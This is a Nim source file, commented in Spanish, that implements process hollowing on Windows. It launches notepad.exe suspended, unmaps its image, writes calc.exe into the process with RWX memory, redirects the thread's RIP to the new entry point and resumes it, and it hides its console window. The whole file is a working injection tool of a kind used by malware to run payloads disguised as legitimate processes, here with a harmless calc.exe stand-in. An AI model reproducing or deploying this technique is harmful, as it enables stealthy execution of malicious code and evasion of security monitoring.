import winim
import std/os           # readFile
import std/strutils     # toHex

{.passL: "-mwindows".}

type
  NTSTATUS = LONG
  tNtUnmapViewOfSection = proc(
    ProcessHandle: HANDLE,
    BaseAddress: PVOID
  ): NTSTATUS {.stdcall.}

const
  CONTEXT_AMD64 = 0x00100000
  CONTEXT_CONTROL = CONTEXT_AMD64 or 0x1
  CONTEXT_INTEGER = CONTEXT_AMD64 or 0x2
  CONTEXT_SEGMENTS = CONTEXT_AMD64 or 0x4
  CONTEXT_FLOATING_POINT = CONTEXT_AMD64 or 0x8
  CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64 or 0x10
  CONTEXT_FULL = CONTEXT_CONTROL or CONTEXT_INTEGER or CONTEXT_FLOATING_POINT

proc imageFirstSection(pNt: PIMAGE_NT_HEADERS): PIMAGE_SECTION_HEADER =
  ## Equivalente a IMAGE_FIRST_SECTION(pNt)
  cast[PIMAGE_SECTION_HEADER](
    cast[uint64](addr pNt.OptionalHeader) + pNt.FileHeader.SizeOfOptionalHeader.uint64
  )

proc main() =
  let
    targetProcessPath = r"C:\Windows\System32\notepad.exe"
    sourcePePath = r"C:\Windows\System32\calc.exe"

  # 1) Leer PE en string (buffer binario)
  var buf: string
  try:
    buf = readFile(sourcePePath)
  except IOError:
    echo "Error: No se pudo leer el archivo PE fuente"
    return
  if buf.len == 0:
    echo "Error: Archivo PE vacío"; return

  # Puntero base al buffer
  let pBase = cast[pointer](unsafeAddr buf[0])

  # 2) DOS + NT headers
  let pDosHeader = cast[PIMAGE_DOS_HEADER](pBase)
  if pDosHeader.e_magic != IMAGE_DOS_SIGNATURE:
    echo "Error: Firma DOS inválida"; return

  let pNtHeaders = cast[PIMAGE_NT_HEADERS](
    cast[uint64](pBase) + pDosHeader.e_lfanew.uint64
  )
  if pNtHeaders.Signature != IMAGE_NT_SIGNATURE:
    echo "Error: Firma NT inválida"; return

  let
    sourceEntryPoint = pNtHeaders.OptionalHeader.AddressOfEntryPoint
    sourceImageBase  = pNtHeaders.OptionalHeader.ImageBase
    sizeOfImage      = pNtHeaders.OptionalHeader.SizeOfImage

  echo "PE Info:"
  echo "  Entry Point: 0x", toHex(sourceEntryPoint)
  echo "  Image Base: 0x", toHex(cast[uint64](sourceImageBase))
  echo "  Size of Image: ", sizeOfImage

  # 3) Crear proceso suspendido
  var si: STARTUPINFO
  var pi: PROCESS_INFORMATION
  ZeroMemory(addr si, sizeof(si))
  si.cb = DWORD(sizeof(si))
  ZeroMemory(addr pi, sizeof(pi))

  var cmd = newWideCString(targetProcessPath)
  if CreateProcessW(
    nil, cmd, nil, nil, FALSE,
    CREATE_SUSPENDED, nil, nil, addr si, addr pi
  ) == 0:
    echo "Error CreateProcessW: ", GetLastError(); return
  echo "Proceso creado con PID: ", pi.dwProcessId

  # 4) Obtener contexto (x64)
  var ctx: CONTEXT
  ctx.ContextFlags = CONTEXT_FULL
  if GetThreadContext(pi.hThread, addr ctx) == 0:
    echo "Error GetThreadContext: ", GetLastError()
    TerminateProcess(pi.hProcess, 1)
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return

  # 5) PEB->ImageBaseAddress
  # En x64, el PEB del hilo inicial suele estar en Rdx
  let pebAddr = ctx.Rdx
  var remoteImageBase: PVOID
  var xfer: SIZE_T
  if ReadProcessMemory(
      pi.hProcess,
      cast[LPCVOID](pebAddr + 0x10),   # PEB+0x10 = ImageBaseAddress
      addr remoteImageBase,
      sizeof(PVOID),
      addr xfer) == 0:
    echo "Error Read PEB: ", GetLastError()
    TerminateProcess(pi.hProcess, 1)
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return
  echo "Current Image Base: 0x", toHex(cast[uint64](remoteImageBase))

  # 6) NtUnmapViewOfSection
  let hNtdll = LoadLibraryA("ntdll.dll")
  if hNtdll == 0: echo "Error LoadLibrary ntdll"
  let pNtUnmapViewOfSection = cast[tNtUnmapViewOfSection](GetProcAddress(hNtdll, "NtUnmapViewOfSection"))
  if pNtUnmapViewOfSection == nil: echo "Error GetProcAddress NtUnmapViewOfSection"

  let status = pNtUnmapViewOfSection(pi.hProcess, remoteImageBase)
  if status != 0'i32:
    echo "NtUnmapViewOfSection falló: ", status

  # 7) VirtualAllocEx en la base preferida (o donde el sistema quiera)
  var newImageBase = VirtualAllocEx(
    pi.hProcess,
    cast[LPVOID](sourceImageBase),
    sizeOfImage,
    MEM_COMMIT or MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
  )
  if newImageBase == nil:
    # Reintentar sin base preferida (opcional)
    newImageBase = VirtualAllocEx(
      pi.hProcess, nil, sizeOfImage,
      MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE
    )
  if newImageBase == nil:
    echo "Error VirtualAllocEx: ", GetLastError()
  echo "New Image Base: 0x", toHex(cast[uint64](newImageBase))

  # 8) Escribir headers
  if WriteProcessMemory(
      pi.hProcess,
      newImageBase,
      pBase,
      pNtHeaders.OptionalHeader.SizeOfHeaders,
      addr xfer) == 0:
    echo "Error Write headers: ", GetLastError()

  # 9) Escribir secciones (usar UncheckedArray + índice int)
  let firstSec = imageFirstSection(pNtHeaders)
  let secs = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](firstSec)
  let nSecs = int(pNtHeaders.FileHeader.NumberOfSections)

  for i in 0 ..< nSecs:
    let s = secs[i]
    if s.SizeOfRawData > 0:
      let dest = cast[LPVOID](cast[uint64](newImageBase) + s.VirtualAddress.uint64)
      let src  = cast[LPCVOID](cast[uint64](pBase)       + s.PointerToRawData.uint64)
      if WriteProcessMemory(pi.hProcess, dest, src, s.SizeOfRawData, addr xfer) == 0:
        # Name no es NUL-terminated; imprimir como hex/simple
        echo "Error Write sección #", i, ": ", GetLastError()

  # 10) Fix entrypoint: ***x64 usa RIP***
  ctx.Rip = cast[DWORD64](cast[uint64](newImageBase) + sourceEntryPoint.uint64)

  # 11) Actualizar PEB->ImageBaseAddress con la nueva base
  if WriteProcessMemory(
      pi.hProcess,
      cast[LPVOID](pebAddr + 0x10),
      addr newImageBase,
      sizeof(PVOID),
      addr xfer) == 0:
    echo "Warning: no se pudo actualizar PEB ImageBase: ", GetLastError()

  if SetThreadContext(pi.hThread, addr ctx) == 0:
    echo "Error SetThreadContext: ", GetLastError()

  if ResumeThread(pi.hThread) == DWORD(-1):
    echo "Error ResumeThread: ", GetLastError()
  else:
    echo "Proceso inyectado exitosamente!"

  # Limpieza
  CloseHandle(pi.hProcess)
  CloseHandle(pi.hThread)
  if hNtdll != 0: discard FreeLibrary(hNtdll)
  return


when isMainModule:
  main()
